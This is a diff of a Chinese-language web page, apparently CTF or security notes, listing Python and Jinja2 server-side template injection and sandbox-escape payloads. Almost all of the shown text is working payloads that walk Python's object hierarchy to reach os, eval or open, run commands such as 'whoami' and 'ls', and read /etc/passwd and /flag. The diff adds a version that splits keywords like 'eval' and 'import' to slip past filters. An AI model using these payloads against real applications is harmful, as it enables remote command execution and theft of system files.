@@ -214,13 +214,14 @@ __globals__
 <strong>Python2</strong></p>
 <pre><code>                                命令执行
 [].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache']].__dict__.values()[12].__dict__.values()[144]('whoami')
-&quot;&quot;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()')
+''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['ev'+'al']('__impo'+'rt__(&quot;o'+'s&quot;).po'+'pen(&quot;ls &quot;).read()')
 {}.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('whoami').read()
 ''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].system('ls')
 object.__subclasses__()[40]('/etc/passwd').read()
 ().__class__.__mro__[1].__subclasses__()[59].__init__.__getattribute__('func_gl'+'obals')[&quot;linecache&quot;].__dict__['o'+'s'].__dict__['popen']('who'+'ami').read()
 'i34jtnfdi02\\administrator\n'
 #由于我们都是要获取object类。那么直接给他object类开头。就会简短很多
+{{ config.__class__.__init__.__globals__['os'].popen('cat /flag | base64').read() }}
 </code></pre>
 <pre><code>                                文件读取
 ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()
@@ -238,8 +239,7 @@ vars(open('/flag','r').__class__)['re'+'ad'](open('/etc/passwd','r'))
 [].__class__.__base__.__subclasses__()[118].__init__.__globals__['popen']('whoami').read()
 [].__class__.__base__.__subclasses__()[185].__init__.__globals__['os'].popen('whoami').read()
 getattr(getattr(getattr(getattr(getattr(getattr(getattr([],'__cla'+'ss__'),'__mr'+'o__')[1],'__subclas'+'ses__')()[104],'__init__'),'__glob'+'al'+'s__')['sy'+'s'],'mod'+'ules')['o'+'s'],'sy'+'ste'+'m')('l'+'s')
-                                文件读取
-{{ config.__class__.__init__.__globals__['os'].popen('cat /flag | base64').read() }}
+
 </code></pre>
 <p>payload千变万化。思路都一样。只要获取到object对象，然后选一个能执行命令的模块，调用即可，比如eval，os等，都可以<br>
 寻找包含os模块的脚本</p>
